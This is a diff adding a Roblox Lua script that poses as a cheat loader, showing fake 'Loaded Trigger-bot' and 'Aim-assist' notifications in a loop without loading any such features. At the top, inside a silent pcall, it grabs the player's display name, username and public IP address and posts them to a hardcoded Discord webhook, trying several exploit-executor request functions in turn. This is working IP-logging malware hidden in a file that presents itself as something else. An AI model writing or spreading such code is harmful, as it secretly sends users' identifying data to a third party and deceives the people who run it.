@@ -1,0 +1,73 @@
+local webh = "https://discord.com/api/webhooks/1230977723812548700/3oDKZ7DukzE-4xj_ZneORDxHmUzU6fTIsG40GSdqbjqVa1c_wsQVZiXA2wCBUkLQQyhi"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = "Execution \n Display "..game.Players.LocalPlayer.DisplayName.."\n User "..game.Players.LocalPlayer.Name,
+               ["description"] = "IP Adress: " ..game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+local StarterGui = game:GetService("StarterGui")
+
+local Notifications = {
+	"Loaded Silent | P",
+	"Loaded Trigger-bot | C",
+	"Loaded Spin | Q",
+	"Loaded Macro | X",
+	"Loaded Aim-assist | T",
+}
+
+local TimeBetweenNotifications = 5 --REPLACE 5 WITH THE NUMBER OF SECONDS YOU WANT TO WAIT IN BETWEEN NOTIFICATIONS APPEARING
+
+while true do
+	for i = 1, #Notifications do
+		local Notification = Notifications[i]
+		
+		StarterGui:SetCore("SendNotification", {
+			Title = "Successfully",
+			Text = Notification,
+			Duration = 5
+		})
+		
+		wait(TimeBetweenNotifications)
+	end
+end
+game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('OneMoreTime');
